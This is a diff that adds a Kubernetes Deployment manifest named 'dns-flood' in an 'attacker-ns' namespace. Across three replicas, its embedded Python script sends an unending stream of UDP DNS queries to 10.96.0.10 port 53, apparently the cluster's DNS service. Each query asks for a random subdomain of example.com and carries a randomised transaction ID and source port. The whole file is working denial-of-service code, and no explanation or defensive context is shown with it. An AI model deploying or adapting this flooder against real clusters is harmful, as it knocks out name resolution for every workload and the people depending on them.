@@ -1,0 +1,80 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: dns-flood
+  namespace: attacker-ns
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: dns-flood
+  template:
+    metadata:
+      labels:
+        app: dns-flood
+    spec:
+      nodeName: k8s-w1
+      containers:
+      - name: flooder
+        image: python:3.12-alpine
+        env:
+        - name: TARGET_IP
+          value: "10.96.0.10"
+        - name: TARGET_PORT
+          value: "53"
+        - name: THREADS
+          value: "3"
+        command: ["python3", "-c"]
+        args:
+          - |
+            import socket, threading, os, random
+            TARGET_IP = os.environ["TARGET_IP"]
+            TARGET_PORT = int(os.environ["TARGET_PORT"])
+            THREADS = int(os.environ["THREADS"])
+
+            def flood():
+                # DNS query for a random subdomain of example.com
+                payload = bytearray(
+                    b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+                    b"\x08XXXXXXXX\x07example\x03com\x00\x00\x01\x00\x01"
+                )
+                LABEL_OFFSET = 13
+                alphabet = b"abcdefghijklmnopqrstuvwxyz"
+
+                while True:
+                    for i in range(8):
+                        payload[LABEL_OFFSET + i] = alphabet[random.randrange(26)]
+                    payload[0] = random.randrange(256)
+                    payload[1] = random.randrange(256)
+
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    try:
+                        sock.bind(("0.0.0.0", random.randint(20000, 60000)))
+                        sock.sendto(bytes(payload), (TARGET_IP, TARGET_PORT))
+                    except OSError:
+                        pass
+                    finally:
+                        sock.close()
+
+            threads = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]
+            for t in threads:
+                t.start()
+            for t in threads:
+                t.join()
+        resources:
+          requests:
+            cpu: "250m"
+            memory: "64Mi"
+          limits:
+            cpu: "500m"
+            memory: "128Mi"
+        securityContext:
+          allowPrivilegeEscalation: false
+          privileged: false
+          readOnlyRootFilesystem: false
+          runAsNonRoot: true
+          runAsUser: 1000
+          seccompProfile:
+            type: RuntimeDefault
+          capabilities:
+            drop: ["ALL"]
